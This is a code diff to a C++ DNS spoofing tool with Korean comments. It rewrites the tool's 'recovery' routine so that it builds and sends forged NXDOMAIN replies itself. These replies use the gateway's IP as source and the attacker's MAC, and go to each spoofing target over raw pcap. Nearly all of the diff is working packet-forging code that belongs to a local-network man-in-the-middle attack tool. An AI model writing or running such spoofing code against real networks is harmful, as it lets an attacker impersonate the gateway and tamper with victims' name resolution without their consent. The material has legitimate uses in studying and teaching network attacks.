@@ -295,7 +295,7 @@ void DnsSpoofer::send_spoof_response(pcap_t* handle,
                 if (current[0] == 0xC0)
                     current += 2;
                 else {
-                    while (*current != 0 && (current - dns_data) < dns_len)
+                    while (*current != 0 && (current - dns_data) < dns_len) 
                         current += (*current) + 1;
                     current++;
                 }
@@ -322,12 +322,14 @@ void DnsSpoofer::send_spoof_response(pcap_t* handle,
 }
 
 
+
+
 void DnsSpoofer::send_recovery_responses(pcap_t* handle,
                                           const uint8_t* attacker_mac,
                                           const uint8_t* gateway_ip,
                                           const vector<unique_ptr<SpoofTarget>>& targets)
 {
-    cout << "DNS 스푸핑 복구 시작 NXDOMAIN 패킷..." << endl;
+    cout << "DNS 스푸핑 복구 시작 - NXDOMAIN 패킷 직접 생성..." << endl;
 
     // recovery_domains 리스트에 있는 각 도메인에 대해 복구 패킷 전송
     for (const auto& domain : recovery_domains) {
@@ -337,68 +339,123 @@ void DnsSpoofer::send_recovery_responses(pcap_t* handle,
             c = tolower(c);
         }
         
-        // 캐시에서 해당 도메인의 템플릿이 있는지 확인
-        if (template_cache.find(normalized_domain) == template_cache.end()) {
-            cerr << "[" << domain << "] DNS 템플릿 없음. 복구 생략.\n";
-            continue;
+        // 각 스푸핑 대상에 대해 NXDOMAIN 패킷을 생성하여 전송
+        for (const auto& target : targets) {
+            // 패킷 생성 - 직접 구현
+            create_and_send_nxdomain_packet(handle, 
+                                           attacker_mac, 
+                                           target->get_mac(), 
+                                           gateway_ip, 
+                                           target->get_ip(), 
+                                           normalized_domain);
         }
-        bool found_template = false;
-        // 저장된 템플릿 중 A 레코드(타입 1) 응답을 선택
-        for (const auto& cache_entry : template_cache[normalized_domain]) {
-            if (cache_entry.qtype == 1 && cache_entry.is_response) {
-                found_template = true;
-                // 각 스푸핑 대상에 대해 NXDOMAIN 패킷을 전송
-                for (const auto& target : targets) {
-                    vector<uint8_t> nxdomain_packet = cache_entry.packet;
-                    const int eth_len = 14;
-
-                    // Ethernet 헤더에서 공격자/대상 MAC 주소를 설정
-                    struct ether_header* eth_nx = reinterpret_cast<struct ether_header*>(nxdomain_packet.data());
-                    memcpy(eth_nx->ether_shost, attacker_mac, 6);
-                    memcpy(eth_nx->ether_dhost, target->get_mac(), 6);
-
-                    // IP 헤더를 수정하여, 게이트웨이 IP를 출발지, 대상의 IP를 목적지로 설정하고 TTL을 0으로 지정
-                    struct ip* ip_nx = reinterpret_cast<struct ip*>(nxdomain_packet.data() + eth_len);
-                    int ip_header_len = ip_nx->ip_hl * 4;
-                    memcpy(&ip_nx->ip_src, gateway_ip, 4);
-                    memcpy(&ip_nx->ip_dst, target->get_ip(), 4);
-                    ip_nx->ip_ttl = 0; // TTL 
-                    ip_nx->ip_id = htons(rand() % 65536);
-                    ip_nx->ip_sum = 0;
-                    uint16_t* ip_words = reinterpret_cast<uint16_t*>(ip_nx);
-                    unsigned long ip_sum = 0;
-                    for (int i = 0; i < ip_header_len/2; i++) {
-                        ip_sum += ntohs(ip_words[i]);
-                    }
-                    while (ip_sum >> 16)
-                        ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
-                    ip_nx->ip_sum = htons(~ip_sum);
-                    
-                    // UDP 헤더 및 DNS 헤더 설정 (재전송을 위한 랜덤 ID 및 NXDOMAIN 플래그 설정)
-                    struct udphdr* udp_nx = reinterpret_cast<struct udphdr*>(nxdomain_packet.data() + eth_len + ip_header_len);
-                    dns_hdr* dns_nx = reinterpret_cast<dns_hdr*>(nxdomain_packet.data() + eth_len + ip_header_len + sizeof(struct udphdr));
-                    dns_nx->id = htons(rand() % 65535);
-                    uint16_t flags = ntohs(dns_nx->flags);
-                    flags = (flags & 0xFFF0) | 0x0003; // RCODE 3: NXDOMAIN
-                    dns_nx->flags = htons(flags);
-                    dns_nx->ancount = 0; // NXDOMAIN 응답은 정답 섹션이 없음.
-                    
-                    // NXDOMAIN 패킷 3회 전송
-                    for (int i = 0; i < 3; i++) {
-                        if (pcap_sendpacket(handle, nxdomain_packet.data(), nxdomain_packet.size()) != 0)
-                            cerr << "NXDOMAIN 패킷 전송 실패: " << pcap_geterr(handle) << endl;
-                        else
-                            cout << "NXDOMAIN 패킷 전송 성공 " << domain 
-                                 << " (대상: " << target->get_ip_str() << ")" << endl;
-                        usleep(10000);
-                    }
-                    usleep(50000);
-                }
-                break;
-            }
-        }
-        if (!found_template)
-            cerr << "[" << domain << "] A 레코드 템플릿을 찾지 못했습니다. 복구 생략.\n";
     }
     cout << "DNS 스푸핑 복구 패킷 전송 완료" << endl;
+}
+
+// 새로운 함수: 직접 NXDOMAIN 패킷 생성
+void DnsSpoofer::create_and_send_nxdomain_packet(pcap_t* handle,
+                                               const uint8_t* src_mac,
+                                               const uint8_t* dst_mac,
+                                               const uint8_t* src_ip,
+                                               const uint8_t* dst_ip,
+                                               const string& domain)
+{
+    // 패킷 크기 계산
+    // Ethernet(14) + IP(20) + UDP(8) + DNS 헤더(12) + 도메인 이름 + 종료 바이트(1) + 질문 타입(2) + 질문 클래스(2)
+    size_t domain_len = 0;
+    vector<string> domain_parts;
+    
+    // 도메인 파싱 (점으로 구분된 부분 추출)
+    stringstream ss(domain);
+    string part;
+    while (getline(ss, part, '.')) {
+        domain_parts.push_back(part);
+        // 각 부분의 길이 바이트 + 실제 문자열 길이
+        domain_len += part.length() + 1;
+    }
+    domain_len += 1; // 종료 NULL 바이트
+
+    // 패킷 크기 계산
+    size_t packet_size = 14 + 20 + 8 + 12 + domain_len + 4;
+    
+    // 패킷 버퍼 할당
+    uint8_t* packet = new uint8_t[packet_size];
+    memset(packet, 0, packet_size);
+    
+    // 1. Ethernet 헤더 설정
+    struct ether_header* eth = reinterpret_cast<struct ether_header*>(packet);
+    memcpy(eth->ether_shost, src_mac, 6);
+    memcpy(eth->ether_dhost, dst_mac, 6);
+    eth->ether_type = htons(ETHERTYPE_IP);
+    
+    // 2. IP 헤더 설정
+    struct ip* ip_hdr = reinterpret_cast<struct ip*>(packet + 14);
+    ip_hdr->ip_v = 4;
+    ip_hdr->ip_hl = 5; // 헤더 길이 (5 * 4 = 20 바이트)
+    ip_hdr->ip_tos = 0;
+    ip_hdr->ip_len = htons(packet_size - 14); // IP 패킷 총 길이
+    ip_hdr->ip_id = htons(rand() % 65536);    // 랜덤 ID 생성
+    ip_hdr->ip_off = 0;
+    ip_hdr->ip_ttl = 64;                      // TTL 설정
+    ip_hdr->ip_p = IPPROTO_UDP;               // UDP 프로토콜
+    memcpy(&ip_hdr->ip_src, src_ip, 4);      // 출발지 IP (게이트웨이)
+    memcpy(&ip_hdr->ip_dst, dst_ip, 4);      // 목적지 IP (타겟)
+    
+    // IP 체크섬 계산
+    ip_hdr->ip_sum = 0;
+    uint16_t* ip_words = reinterpret_cast<uint16_t*>(ip_hdr);
+    uint32_t ip_sum = 0;
+    for (int i = 0; i < ip_hdr->ip_hl * 2; i++) {
+        ip_sum += ntohs(ip_words[i]);
+    }
+    while (ip_sum >> 16) {
+        ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
+    }
+    ip_hdr->ip_sum = htons(~ip_sum);
+    
+    // 3. UDP 헤더 설정
+    struct udphdr* udp_hdr = reinterpret_cast<struct udphdr*>(packet + 14 + 20);
+    udp_hdr->uh_sport = htons(DNS_PORT);      // 출발지 포트 (DNS 서버)
+    udp_hdr->uh_dport = htons(1024 + (rand() % 64511)); // 랜덤 목적지 포트
+    udp_hdr->uh_ulen = htons(packet_size - 14 - 20); // UDP 길이
+    udp_hdr->uh_sum = 0; // UDP 체크섬 (선택사항이므로 0으로 설정)
+    
+    // 4. DNS 헤더 설정
+    dns_hdr* dns = reinterpret_cast<dns_hdr*>(packet + 14 + 20 + 8);
+    dns->id = htons(rand() % 65536);          // 랜덤 트랜잭션 ID
+    dns->flags = htons(0x8183);               // 응답 + NXDOMAIN (RCODE=3)
+    dns->qdcount = htons(1);                  // 질문 개수
+    dns->ancount = htons(0);                  // 응답 없음
+    dns->nscount = htons(0);                  // 권한 응답 없음
+    dns->arcount = htons(0);                  // 추가 정보 없음
+    
+    // 5. DNS 질문 섹션 설정
+    uint8_t* qptr = packet + 14 + 20 + 8 + 12;
+    for (const auto& part : domain_parts) {
+        *qptr++ = part.length();              // 레이블 길이
+        memcpy(qptr, part.c_str(), part.length()); // 레이블 내용
+        qptr += part.length();
+    }
+    *qptr++ = 0;                              // 도메인 이름 종료 null 바이트
+    
+    // A 레코드 요청 (Type = 1, Class = 1)
+    *qptr++ = 0;
+    *qptr++ = 1;  // Type = A (주소 레코드)
+    *qptr++ = 0;
+    *qptr++ = 1;  // Class = IN (인터넷)
+    
+    // 패킷 3회 전송
+    for (int i = 0; i < 3; i++) {
+        if (pcap_sendpacket(handle, packet, packet_size) != 0) {
+            cerr << "NXDOMAIN 패킷 전송 실패: " << pcap_geterr(handle) << endl;
+        } else {
+            cout << "NXDOMAIN 패킷 전송 성공 " << domain 
+                 << " (대상: " << NetworkUtils::ip_to_string(dst_ip) << ")" << endl;
+        }
+        usleep(10000);  // 10ms 대기
+    }
+    
+    // 메모리 해제
+    delete[] packet;
 }
